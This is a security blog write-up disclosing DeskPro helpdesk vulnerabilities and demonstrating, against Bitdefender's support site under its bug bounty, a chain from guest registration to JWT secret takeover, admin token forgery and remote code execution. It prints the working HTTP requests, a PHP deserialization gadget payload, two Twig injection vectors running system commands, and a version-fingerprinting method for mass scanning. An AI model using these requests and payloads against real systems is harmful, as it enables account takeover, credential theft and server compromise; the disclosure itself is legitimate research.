+<p>DeskPro has clients in different industries. Some of the well-known names per their website are: Microsoft, Siemens, P&amp;G, Vodafone, HMRC, CapitalOne, Panasonic, NHS, Valve, Brown University, Hotel Chocolat, Garmin, Team USA, Arrow, Pure, Xerox, 1&amp;1, Booz Allen Hamilton, Bitdefender, US Department of Defense and more.</p>
+<p>The last published CVE/exploit for DeskPro was in 2007 and last (and only) security advisory on their current website was in 2015. This meant that either this application is robust or overlooked. So we took the challenge and we decided to see for ourselves.</p>
+<h1>Vulnerability Details<span class="ez-toc-section" id="Vulnerability_Details"></span></h1>
+<p>Since we have much to present and this article is already getting long, we decided to keep the upcoming parts focused on the discovered vulnerabilities themselves rather than the motivation and paths used to find them, if anyone is interested, please let us know in the comments.</p>
+<h2>1. Insufficient Access Control at Multiple API endpoints<span class="ez-toc-section" id="1_Insufficient_Access_Control_at_Multiple_API_endpoints"></span></h2>
+<p style="text-align: justify;">DeskPro shows high degree of automation and integration through API interfaces that enable developers to build apps that interact with different components of the system. However, multiple API endpoints were found to have a problem properly validating user’s privilege, giving a normal user arbitrary unauthorized access to various actions and information. The following table shows the most important ones</p>
+<h3>/api/apps/*  &#8211; (CVE-2020-11465)<span class="ez-toc-section" id="apiapps_CVE-2020-11465"></span></h3>
+<p>Controlling/installing helpdesk applications, leaking current applications’ configurations, <em>including applications used as user sources (used for authentication) such as JWT</em>.  This enables an attacker to forge valid authentication models that resembles any user on the system <strong>(Privilege Escalation)</strong></p>
+<h3>/api/email_accounts &#8211; (CVE-2020-11463)<span class="ez-toc-section" id="apiemail_accounts_CVE-2020-11463"></span></h3>
+<p>Retrieve plaintext credentials of all helpdesk email accounts, including incoming and outgoing email credentials</p>
+<h3>/api/tickets &#8211; (CVE-2020-11466)<span class="ez-toc-section" id="apitickets_CVE-2020-11466"></span></h3>
+<p>Retrieve sensitive information about all helpdesk tickets stored in database with numerous filters. Additionally, it leaks ticket auth code, making it possible to make changes to the ticket</p>
+<h3>/api/people &#8211; (CVE-2020-11464)<span class="ez-toc-section" id="apipeople_CVE-2020-11464"></span></h3>
+<p>Retrieve sensitive information about all users’ registered on the system. This includes their full name, privilege, email address, phone number…etc. (will be of a good use in our attack scenario)</p>
+<h2>2. Insecure Deserialization to RCE in Template Editing Feature <strong>(Needs Admin Privilege) [CVE-2020-11467]</strong><span class="ez-toc-section" id="2_Insecure_Deserialization_to_RCE_in_Template_Editing_Feature_Needs_Admin_Privilege_CVE-2020-11467"></span></h2>
+<p>DeskPro enables administrators to modify helpdesk interface by editing theme templates and uses TWIG as its template engine. While direct access to <code class="EnlighterJSRAW" data-enlighter-language="generic">self</code>, <code class="EnlighterJSRAW" data-enlighter-language="generic">_self</code> variables was not permitted, we could abuse the accessible variables in our context to reach PHP’s native <code class="EnlighterJSRAW" data-enlighter-language="generic">unserialize</code> function where we passed our crafted payload to trigger a set of POP gadgets in order to achieve remote code execution.</p>
+<h1>How to Identify Passively?<span class="ez-toc-section" id="How_to_Identify_Passively"></span></h1>
+<p>There is nothing cooler than launching a mass scanner hacking the world, while you are chilling out enjoying your favorite movie on Netflix 😀 Luckily, this one is easy to deploy, because DeskPro gives you detailed information about current version deployed under the following API call &#8220;<strong>/api/v2/helpdesk/discover</strong>&#8220;. So with a simple unauthenticated GET request, if you find &#8220;<span class="treeLabel stringLabel" aria-labelledby="default" data-level="1">build_name&#8221; less than &#8220;<strong>2019.8.0</strong>&#8220;, it is probably your lucky day.</span></p>
+<h1>Now.. Time for Fun Part.. Exploitation!<span class="ez-toc-section" id="Now_Time_for_Fun_Part_Exploitation"></span></h1>
+<p>So the plan goes as follow, register a normal guest account (self-registration enabled by default), leak JWT secret, login as administrator, trigger deserialization and voila&#8230; server compromised!</p>
+<p>Bitdefender Support Center (support.bitdefender.com) is using Deskpro. So, we will use it as the case study in this article. But first I would like to give Bitdefender team a big shoutout for their awesome response. Although this issue affects a third-party product, they have deployed a temporary fix within hours and fixed the whole thing (in coordination with DeskPro team) in less than 24 hours and they have been cool enough to allow us to publish this article.<br />
+The reason we chose Bitdefender is that through our experience with their bug bounty program, they have always been friendly, highly responsible, and actively encouraging security research to enhance their security posture.</p>
+<p>So let&#8217;s begin!</p>
+<h2>1. Retrieving Limited User API Token<span class="ez-toc-section" id="1_Retrieving_Limited_User_API_Token"></span></h2>
+<p>In order to establish our attack, we need a valid user account, which we can easily obtain via self-registration at <a href="https://support.bitdefender.com/en/register">https://support.bitdefender.com/en/register</a>.</p>
+<p>After activating user’s account, we can request access token by sending username and password to the following API endpoint (https://support.bitdefender.com/api/v2/api_tokens) as shown below</p>
+<p><img class="aligncenter size-full wp-image-507" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://blog.redforce.io/storage/2020/03/Getting_API_Token-1.png" alt="Getting Norma User API Token" width="945" height="773" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-srcset="https://blog.redforce.io/storage/2020/03/Getting_API_Token-1.png 945w, https://blog.redforce.io/storage/2020/03/Getting_API_Token-1-300x245.png 300w, https://blog.redforce.io/storage/2020/03/Getting_API_Token-1-768x628.png 768w" sizes="(max-width: 945px) 100vw, 945px" /><noscript><img class="aligncenter size-full wp-image-507" src="http://blog.redforce.io/storage/2020/03/Getting_API_Token-1.png" alt="Getting Norma User API Token" width="945" height="773" srcset="https://blog.redforce.io/storage/2020/03/Getting_API_Token-1.png 945w, https://blog.redforce.io/storage/2020/03/Getting_API_Token-1-300x245.png 300w, https://blog.redforce.io/storage/2020/03/Getting_API_Token-1-768x628.png 768w" sizes="(max-width: 945px) 100vw, 945px" /></noscript></p>
+<h2>2. Compromising JWT Authentication<span class="ez-toc-section" id="2_Compromising_JWT_Authentication"></span></h2>
+<blockquote><p><strong>Note: Any further requests to API interface would require Authorization header to be set to base64 value of the retrieved API token as shown in the following steps</strong></p></blockquote>
+<p>DeskPro has a set of built-in applications that can be used for authentication, one of them is <a href="https://www.deskpro.com/apps/json-web-token/">JWT app</a> identified by <code class="EnlighterJSRAW" data-enlighter-language="generic">deskpro_us_jwt</code>. As a quick reminder for those who are not much familiar with JWT, it can be regarded as a method for representing claims (such as user identity). To ensure data integrity and security, they are usually signed with a secret key which can be used to validate provided claims. You can find more information <a href="https://jwt.io/introduction/">here</a>.  So, if JWT authentication is enabled and we have this key, we can authenticate to the application as any user.</p>
+<p>Due to access-control vulnerability within DeskPro, normal user&#8217;s could access API endpoints responsible for applications including JWT. Which means, a simple GET request to &#8220;https://support.bitdefender.com/api/apps/packages/deskpro_us_jwt?usersource_type=user&#8221; with normal user privilege, would leak JWT secret.</p>
+<p>In Bitdefender case, JWT authentication was not enabled. However, we managed to enable it by issuing PUT request to the same endpoint as shown below</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="js">PUT /api/apps/packages/deskpro_us_jwt?usersource_type=user HTTP/1.1
+Host: support.bitdefender.com
+Authorization: Basic &lt;redacted&gt;
+Content-Type: application/json
+Content-Length: 269
+
+{"settings":{"sso_type":"none","auto_agent":true,"dp_app":{"title":"JSON Web Token (JWT)"},"actions":[],"enable_usersource":true,"url":"https://www.google.com","secret":"V3ryS3cr3tK3y","algo":"HS256","login_custom_text":"Login","logout_agent_url":"https://www.google.com"}}
+
+</pre>
+<p data-enlighter-language="js">We can confirm that user source is now available by sending GET request to the same endpoint. We identify <code class="EnlighterJSRAW" data-enlighter-language="generic">usersource</code> id from the following screenshot</p>
+<p data-enlighter-language="js"><img class="aligncenter size-full wp-image-511" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://blog.redforce.io/storage/2020/03/jwt_app.png" alt="Retrieving JWT APP Info" width="917" height="620" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-srcset="https://blog.redforce.io/storage/2020/03/jwt_app.png 917w, https://blog.redforce.io/storage/2020/03/jwt_app-300x203.png 300w, https://blog.redforce.io/storage/2020/03/jwt_app-768x519.png 768w" sizes="(max-width: 917px) 100vw, 917px" /><noscript><img class="aligncenter size-full wp-image-511" src="http://blog.redforce.io/storage/2020/03/jwt_app.png" alt="Retrieving JWT APP Info" width="917" height="620" srcset="https://blog.redforce.io/storage/2020/03/jwt_app.png 917w, https://blog.redforce.io/storage/2020/03/jwt_app-300x203.png 300w, https://blog.redforce.io/storage/2020/03/jwt_app-768x519.png 768w" sizes="(max-width: 917px) 100vw, 917px" /></noscript></p>
+<h2 data-enlighter-language="js">3. Getting Administrative Access to Helpdesk<span class="ez-toc-section" id="3_Getting_Administrative_Access_to_Helpdesk"></span></h2>
+<p>To be able to forge a valid administrator JWT token, we need to know administrator&#8217;s email. Instead of guessing or bruteforcing our options, we utilized another broken access-control issue at &#8220;https://support.bitdefender.com/api/people?is_agent=1&#8221; endpoint which brought back to us a list of all system agents and administrators. Administrators had the flag <code class="EnlighterJSRAW" data-enlighter-language="generic">can_admin</code> set to <code class="EnlighterJSRAW" data-enlighter-language="generic">true</code></p>
+<p>After retrieving administrator&#8217;s email, knowing the secret key of JWT authentication app, we managed to forge a valid JWT token and authenticate to the application using the following URL https://support.bitdefender.com/login/authenticate-callback/6?jwt=&lt;redacted&gt;</p>
+<p><img class="aligncenter size-full wp-image-513" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://blog.redforce.io/storage/2020/03/jwt_token.png" alt="Forging Valid JWT Token" width="1549" height="494" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-srcset="https://blog.redforce.io/storage/2020/03/jwt_token.png 1549w, https://blog.redforce.io/storage/2020/03/jwt_token-300x96.png 300w, https://blog.redforce.io/storage/2020/03/jwt_token-1024x327.png 1024w, https://blog.redforce.io/storage/2020/03/jwt_token-768x245.png 768w, https://blog.redforce.io/storage/2020/03/jwt_token-1536x490.png 1536w" sizes="(max-width: 1549px) 100vw, 1549px" /><noscript><img class="aligncenter size-full wp-image-513" src="http://blog.redforce.io/storage/2020/03/jwt_token.png" alt="Forging Valid JWT Token" width="1549" height="494" srcset="https://blog.redforce.io/storage/2020/03/jwt_token.png 1549w, https://blog.redforce.io/storage/2020/03/jwt_token-300x96.png 300w, https://blog.redforce.io/storage/2020/03/jwt_token-1024x327.png 1024w, https://blog.redforce.io/storage/2020/03/jwt_token-768x245.png 768w, https://blog.redforce.io/storage/2020/03/jwt_token-1536x490.png 1536w" sizes="(max-width: 1549px) 100vw, 1549px" /></noscript></p>
+<p><img class="aligncenter size-full wp-image-514" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://blog.redforce.io/storage/2020/03/adminpanel.png" alt="Accessing Bitdefender Support Admin Panel" width="1920" height="688" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-srcset="https://blog.redforce.io/storage/2020/03/adminpanel.png 1920w, https://blog.redforce.io/storage/2020/03/adminpanel-300x108.png 300w, https://blog.redforce.io/storage/2020/03/adminpanel-1024x367.png 1024w, https://blog.redforce.io/storage/2020/03/adminpanel-768x275.png 768w, https://blog.redforce.io/storage/2020/03/adminpanel-1536x550.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px" /><noscript><img class="aligncenter size-full wp-image-514" src="http://blog.redforce.io/storage/2020/03/adminpanel.png" alt="Accessing Bitdefender Support Admin Panel" width="1920" height="688" srcset="https://blog.redforce.io/storage/2020/03/adminpanel.png 1920w, https://blog.redforce.io/storage/2020/03/adminpanel-300x108.png 300w, https://blog.redforce.io/storage/2020/03/adminpanel-1024x367.png 1024w, https://blog.redforce.io/storage/2020/03/adminpanel-768x275.png 768w, https://blog.redforce.io/storage/2020/03/adminpanel-1536x550.png 1536w" sizes="(max-width: 1920px) 100vw, 1920px" /></noscript></p>
+<h2>4. Executing Arbitrary Code on Bitdefender Helpdesk<span class="ez-toc-section" id="4_Executing_Arbitrary_Code_on_Bitdefender_Helpdesk"></span></h2>
+<p>Now with administrative access, we can trigger deserialization vulnerability that exists in theme editing feature. All we need to prepare is a proper POP gadget to achieve code execution. After we have discovered the gadget chain in Guzzle library, we found out that it was already known and published in ambionics&#8217; awesome tool <a href="https://github.com/ambionics/phpggc">PHPGGC</a>, so shoutout for them and @proclnas for the awesome work.</p>
+<p>So, generate the serialized object using PHPGGC (we choose a minimal PoC that executes <code class="EnlighterJSRAW" data-enlighter-language="php">phpinfo()</code> ) and edit application&#8217;s templates to contain your payload and deserialize it as shown in the following request</p>
+<pre class="EnlighterJSRAW" data-enlighter-language="js">PUT /portal/api/style/edit-theme-set/template-sources HTTP/1.1
+Host: support.bitdefender.com
+Cookie: &lt;redacted&gt;
+Content-Type: application/json
+Content-Length: 564
+
+{"template":"Theme::layout.html.twig","code":"{% set p = 'O:24:\"GuzzleHttp\\\\Psr7\\\\FnStream\":2:{s:33:\"\\x00GuzzleHttp\\\\Psr7\\\\FnStream\\x00methods\";a:1:{s:5:\"close\";a:2:{i:0;O:23:\"GuzzleHttp\\\\HandlerStack\":3:{s:32:\"\\x00GuzzleHttp\\\\HandlerStack\\x00handler\";s:1:\"1\";s:30:\"\\x00GuzzleHttp\\\\HandlerStack\\x00stack\";a:1:{i:0;a:1:{i:0;s:7:\"phpinfo\";}}s:31:\"\\x00GuzzleHttp\\\\HandlerStack\\x00cached\";b:0;}i:1;s:7:\"resolve\";}}s:14:\"_fn___toString\";a:2:{i:0;r:4;i:1;s:7:\"resolve\";}}' %} {{var_dump(app.getUser().unserialize(p))}}"}</pre>
+<p>Now, navigate to preview page to trigger your payload (https://support.bitdefender.com/admin-preview-1/new-ticket) as shown below<img class="aligncenter size-full wp-image-515" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="http://blog.redforce.io/storage/2020/03/bitdefender_phpinfo.png" alt="Bitdefender phpinfo() result after payload execution" width="1632" height="985" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-srcset="https://blog.redforce.io/storage/2020/03/bitdefender_phpinfo.png 1632w, https://blog.redforce.io/storage/2020/03/bitdefender_phpinfo-300x181.png 300w, https://blog.redforce.io/storage/2020/03/bitdefender_phpinfo-1024x618.png 1024w, https://blog.redforce.io/storage/2020/03/bitdefender_phpinfo-768x464.png 768w, https://blog.redforce.io/storage/2020/03/bitdefender_phpinfo-1536x927.png 1536w" sizes="(max-width: 1632px) 100vw, 1632px" /><noscript><img class="aligncenter size-full wp-image-515" src="http://blog.redforce.io/storage/2020/03/bitdefender_phpinfo.png" alt="Bitdefender phpinfo() result after payload execution" width="1632" height="985" srcset="https://blog.redforce.io/storage/2020/03/bitdefender_phpinfo.png 1632w, https://blog.redforce.io/storage/2020/03/bitdefender_phpinfo-300x181.png 300w, https://blog.redforce.io/storage/2020/03/bitdefender_phpinfo-1024x618.png 1024w, https://blog.redforce.io/storage/2020/03/bitdefender_phpinfo-768x464.png 768w, https://blog.redforce.io/storage/2020/03/bitdefender_phpinfo-1536x927.png 1536w" sizes="(max-width: 1632px) 100vw, 1632px" /></noscript></p>
+<p>After reaching this point, we reported our findings to Bitdefender and did not attempt to do any lateral movement.</p>
+<h1 id="RCE-Update">[UPDATE]<span class="ez-toc-section" id="UPDATE"></span></h1>
+<p>Mahmoud Gamal (@Zombiehelp54) <a href="https://www.facebook.com/redforce.io/posts/1662187887256156?comment_id=1662259720582306">brought to our attention</a> another way that can be used to achieve remote code execution (RCE) via twig template injection. It was even part of VolgaCTF 2020 Qualifier challenge. Apparently, using any of the following vectors lead to executing system commands.</p>
+<p><code class="EnlighterJSRAW" data-enlighter-language="js">{{ app.request.query.filter(0,'whoami',1024,{'options':'system'}) }}</code></p>
+<p><code class="EnlighterJSRAW" data-enlighter-language="js">{{['whoami']|filter('system')}}</code></p>
+<p>We have tested both vectors on the latest stable version and it works like a charm.</p>
+<h1>Real Impact<span class="ez-toc-section" id="Real_Impact"></span></h1>
+<p>Since most -if not all- helpdesk instances enable self-registration (because, well&#8230; it is a helpdesk for &#8220;customers&#8221;), the vulnerability enables a remote attacker to fully compromise helpdesk instance. This includes all information exchanged between agents and clients which usually contain very sensitive information and PII. Moreover, application configurations and secret keys are leaked (e.g. JIRA API integration public and private keys) . An attacker can also reach company&#8217;s intranet and use this helpdesk instance as a pivot point to infiltrate corporate network.</p>
+<h1>Bitdefender and DeskPro Response<span class="ez-toc-section" id="Bitdefender_and_DeskPro_Response"></span></h1>
+<p>Bitdefender took the issue very seriously and applied full patches in less than 24 hours which was quite remarkable given that the vulnerable code was in a third-party product. So a big shoutout to them and DeskPro team for fast response.</p>
+<p>DeskPro has released a security advisory regarding this issue on their website (https://support.deskpro.com/en/news/posts/deskpro-security-update-2019-09) but they failed to mention the remote code execution warning, we tried to contact them several times in this regard but we have not heard back from them.</p>
+<p>Bitdefender also rewarded us with $5,000 USD as part of their bug bounty program. So thanks for this as well :).</p>
+<h1>What&#8217;s Next?<span class="ez-toc-section" id="Whats_Next"></span></h1>
+<p>In the upcoming articles we will talk about other remote code execution vulnerabilities we discovered in osTicket and Kayako. So go update your systems and get ready to hack the world!</p>
+			
+			<div class="entry-footer">
+								
+								<div class="entry-tags">
+					<p> <a href="https://blog.redforce.io/tag/bugbounty/" rel="tag">Bugbounty</a> <a href="https://blog.redforce.io/tag/deskpro/" rel="tag">DeskPro</a> <a href="https://blog.redforce.io/tag/helpdesk/" rel="tag">Helpdesk</a> <a href="https://blog.redforce.io/tag/information-security/" rel="tag">Information Security</a> </p>
+				</div>
+								
+				
+				
+<div id="disqus_thread"></div>
+			</div>
+		</div>
+		
+	</article>
+	
+	<div id="more-excerpts">
+		<h2>Keep reading</h2>
+		<a href="https://blog.redforce.io/">More &gt;</a>
+		
+		<div class="excerpts">
+				
+		<div class="excerpt has-featured-image">
+		
+				
+			
+				<div class="featured-image-excerpt" style="background-color:">
+			<a href="https://blog.redforce.io/windows-authentication-attacks-part-2-kerberos/">
+				<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://blog.redforce.io/storage/2019/04/Kerberos-VS-Red-Team-Operator-1040x464.png" alt="Windows authentication attacks part 2 - kerberos" class="landscape cw-equal thumbnail post-thumbnail" width="1040" height="464" itemprop="image" /><noscript><img src="https://blog.redforce.io/storage/2019/04/Kerberos-VS-Red-Team-Operator-1040x464.png" alt="Windows authentication attacks part 2 - kerberos" class="landscape cw-equal thumbnail post-thumbnail" width="1040" height="464" itemprop="image" /></noscript>			</a>
+		</div>
+				
+		<div class="entry-header">
+			
+			<a href="https://blog.redforce.io/windows-authentication-attacks-part-2-kerberos/">
+				<h2>Windows authentication attacks part 2 &#8211; kerberos</h2>
+			
+				<div class="entry-excerpt">
+					<p>Kerberos authentication is one of the cores of the AD, knowing how it works facilitates the deep understanding of many attacks.</p>
+				</div>
+			</a>
+			
+			<div class="entry-author">
+				<a href="https://blog.redforce.io/writer/a-sultan/"><img alt='' src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src='https://secure.gravatar.com/avatar/460d27d634b0ce7332e20f1c67298876?s=112&#038;d=mm&#038;r=g' src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-srcset='https://secure.gravatar.com/avatar/460d27d634b0ce7332e20f1c67298876?s=224&#038;d=mm&#038;r=g 2x' class='avatar avatar-112 photo' height='112' width='112' itemprop="image" /><noscript><img alt='' src='https://secure.gravatar.com/avatar/460d27d634b0ce7332e20f1c67298876?s=112&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/460d27d634b0ce7332e20f1c67298876?s=224&#038;d=mm&#038;r=g 2x' class='avatar avatar-112 photo' height='112' width='112' itemprop="image" /></noscript></a>
+			</div>
+			
+			<div class="entry-meta">
+								<strong><a href="https://blog.redforce.io/category/active-directory/" rel="category tag">Active directory</a> <a href="https://blog.redforce.io/category/red-teaming/" rel="category tag">Red teaming</a></strong> &nbsp; • &nbsp;
+								<span class="entry-date">April 28, 2020</span> 
+				<a href="https://blog.redforce.io/windows-authentication-attacks-part-2-kerberos/" class="entry-read-time"><span>&nbsp; • &nbsp;</span>
+					84 min read				</a>
+			</div>
+		</div>
+		
+	</div>		<div class="excerpt has-featured-image">
+		
+				
+			
+				<div class="featured-image-excerpt" style="background-color:">
+			<a href="https://blog.redforce.io/windows-authentication-and-attacks-part-1-ntlm/">
+				<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://blog.redforce.io/storage/2020/04/Screen-Shot-2020-04-02-at-9.32.33-PM-1040x464.png" alt="Windows authentication attacks - part 1" class="landscape cw-equal thumbnail post-thumbnail" width="1040" height="464" itemprop="image" /><noscript><img src="https://blog.redforce.io/storage/2020/04/Screen-Shot-2020-04-02-at-9.32.33-PM-1040x464.png" alt="Windows authentication attacks - part 1" class="landscape cw-equal thumbnail post-thumbnail" width="1040" height="464" itemprop="image" /></noscript>			</a>
+		</div>
+				
+		<div class="entry-header">
+			
+			<a href="https://blog.redforce.io/windows-authentication-and-attacks-part-1-ntlm/">
+				<h2>Windows authentication attacks &#8211; part 1</h2>
+			
+				<div class="entry-excerpt">
+					<p>In order to understand attacks such as Pass the hash, relaying, Kerberos attacks, one should have pretty good knowledge about the windows Authentication / Authorization process.<br />
+That&#8217;s what we&#8217;re going to achieve in this series.<br />
+In this part we&#8217;re discussing the different types of windows hashes and focus on the NTLM authentication process.</p>
+				</div>
+			</a>
+			
+			<div class="entry-author">
+				<a href="https://blog.redforce.io/writer/a-sultan/"><img alt='' src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src='https://secure.gravatar.com/avatar/460d27d634b0ce7332e20f1c67298876?s=112&#038;d=mm&#038;r=g' src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-srcset='https://secure.gravatar.com/avatar/460d27d634b0ce7332e20f1c67298876?s=224&#038;d=mm&#038;r=g 2x' class='avatar avatar-112 photo' height='112' width='112' itemprop="image" /><noscript><img alt='' src='https://secure.gravatar.com/avatar/460d27d634b0ce7332e20f1c67298876?s=112&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/460d27d634b0ce7332e20f1c67298876?s=224&#038;d=mm&#038;r=g 2x' class='avatar avatar-112 photo' height='112' width='112' itemprop="image" /></noscript></a>
+			</div>
+			
+			<div class="entry-meta">
+								<strong><a href="https://blog.redforce.io/category/red-teaming/" rel="category tag">Red teaming</a></strong> &nbsp; • &nbsp;
+								<span class="entry-date">April 2, 2020</span> 
+				<a href="https://blog.redforce.io/windows-authentication-and-attacks-part-1-ntlm/" class="entry-read-time"><span>&nbsp; • &nbsp;</span>
+					26 min read				</a>
+			</div>
+		</div>
+		
+	</div>		<div class="excerpt has-featured-image">
+		
+				
+			
+				<div class="featured-image-excerpt" style="background-color:">
+			<a href="https://blog.redforce.io/oh-my-kerberos-do-not-get-kerberoasted/">
+				<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://blog.redforce.io/storage/2019/04/Kerberos-VS-Red-Team-Operator-1040x464.png" alt="Oh, My Kerberos! Do Not Get Kerberoasted!" class="landscape cw-equal thumbnail post-thumbnail" width="1040" height="464" itemprop="image" /><noscript><img src="https://blog.redforce.io/storage/2019/04/Kerberos-VS-Red-Team-Operator-1040x464.png" alt="Oh, My Kerberos! Do Not Get Kerberoasted!" class="landscape cw-equal thumbnail post-thumbnail" width="1040" height="464" itemprop="image" /></noscript>			</a>
+		</div>
+				
+		<div class="entry-header">
+			
+			<a href="https://blog.redforce.io/oh-my-kerberos-do-not-get-kerberoasted/">
+				<h2>Oh, My Kerberos! Do Not Get Kerberoasted!</h2>
+			
+				<div class="entry-excerpt">
+					<p>&nbsp; Part of an upcoming series trying to shed the light on attacks targeting Microsoft Kerberos implementation in Active Directory &#8230;</p>
+				</div>
+			</a>
+			
+			<div class="entry-author">
+				<a href="https://blog.redforce.io/writer/hatem/"><img alt='' src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src='https://secure.gravatar.com/avatar/eb4bee3b51778a3d264dee799ec2fbb4?s=112&#038;d=mm&#038;r=g' src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-srcset='https://secure.gravatar.com/avatar/eb4bee3b51778a3d264dee799ec2fbb4?s=224&#038;d=mm&#038;r=g 2x' class='avatar avatar-112 photo' height='112' width='112' itemprop="image" /><noscript><img alt='' src='https://secure.gravatar.com/avatar/eb4bee3b51778a3d264dee799ec2fbb4?s=112&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/eb4bee3b51778a3d264dee799ec2fbb4?s=224&#038;d=mm&#038;r=g 2x' class='avatar avatar-112 photo' height='112' width='112' itemprop="image" /></noscript></a>
+			</div>
+			
+			<div class="entry-meta">
+								<strong><a href="https://blog.redforce.io/category/active-directory/" rel="category tag">Active directory</a> <a href="https://blog.redforce.io/category/red-teaming/" rel="category tag">Red teaming</a></strong> &nbsp; • &nbsp;
+								<span class="entry-date">April 9, 2019</span> 
+				<a href="https://blog.redforce.io/oh-my-kerberos-do-not-get-kerberoasted/" class="entry-read-time"><span>&nbsp; • &nbsp;</span>
+					15 min read				</a>
+			</div>
+		</div>
+		
+	</div>		<div class="excerpt has-featured-image">
+		
+				
+			
+				<div class="featured-image-excerpt" style="background-color:">
+			<a href="https://blog.redforce.io/sql-injection-in-insert-update-query-without-comma/">
+				<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://blog.redforce.io/storage/2019/02/sqli2-1000x464.jpg" alt="Comma is forbidden! No worries!! Inject in insert/update queries without it" class="landscape cw-greater thumbnail post-thumbnail" width="1000" height="464" itemprop="image" /><noscript><img src="https://blog.redforce.io/storage/2019/02/sqli2-1000x464.jpg" alt="Comma is forbidden! No worries!! Inject in insert/update queries without it" class="landscape cw-greater thumbnail post-thumbnail" width="1000" height="464" itemprop="image" /></noscript>			</a>
+		</div>
+				
+		<div class="entry-header">
+			
+			<a href="https://blog.redforce.io/sql-injection-in-insert-update-query-without-comma/">
+				<h2>Comma is forbidden! No worries!! Inject in insert/update queries without it</h2>
+			
+				<div class="entry-excerpt">
+					<p>A writeup regarding exploiting SQL injection issue in an insert query while it wasn&#8217;t possible to use a comma at my payload at all.</p>
+				</div>
+			</a>
+			
+			<div class="entry-author">
+				<a href="https://blog.redforce.io/writer/a-sultan/"><img alt='' src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src='https://secure.gravatar.com/avatar/460d27d634b0ce7332e20f1c67298876?s=112&#038;d=mm&#038;r=g' src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-srcset='https://secure.gravatar.com/avatar/460d27d634b0ce7332e20f1c67298876?s=224&#038;d=mm&#038;r=g 2x' class='avatar avatar-112 photo' height='112' width='112' itemprop="image" /><noscript><img alt='' src='https://secure.gravatar.com/avatar/460d27d634b0ce7332e20f1c67298876?s=112&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/460d27d634b0ce7332e20f1c67298876?s=224&#038;d=mm&#038;r=g 2x' class='avatar avatar-112 photo' height='112' width='112' itemprop="image" /></noscript></a>
+			</div>
+			
+			<div class="entry-meta">
+								<strong><a href="https://blog.redforce.io/category/web-security/" rel="category tag">Web Security</a></strong> &nbsp; • &nbsp;
+								<span class="entry-date">March 31, 2019</span> 
+				<a href="https://blog.redforce.io/sql-injection-in-insert-update-query-without-comma/" class="entry-read-time"><span>&nbsp; • &nbsp;</span>
+					13 min read				</a>
+			</div>
+		</div>
+		
+	</div>		<div class="excerpt has-featured-image">
+		
+				
+			
+				<div class="featured-image-excerpt" style="background-color:">
+			<a href="https://blog.redforce.io/shareit-vulnerabilities-enable-unrestricted-access-to-adjacent-devices-files/">
+				<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://blog.redforce.io/storage/2019/02/shareit_post_cover-1040x464.jpg" alt="DUMPit - The new SHAREit Vulnerability" class="landscape cw-equal thumbnail post-thumbnail" width="1040" height="464" itemprop="image" /><noscript><img src="https://blog.redforce.io/storage/2019/02/shareit_post_cover-1040x464.jpg" alt="DUMPit - The new SHAREit Vulnerability" class="landscape cw-equal thumbnail post-thumbnail" width="1040" height="464" itemprop="image" /></noscript>			</a>
+		</div>
+				
+		<div class="entry-header">
+			
+			<a href="https://blog.redforce.io/shareit-vulnerabilities-enable-unrestricted-access-to-adjacent-devices-files/">
+				<h2>SHAREit Multiple Vulnerabilities Enable Unrestricted Access to Adjacent Devices&#8217; Files</h2>
+			
+				<div class="entry-excerpt">
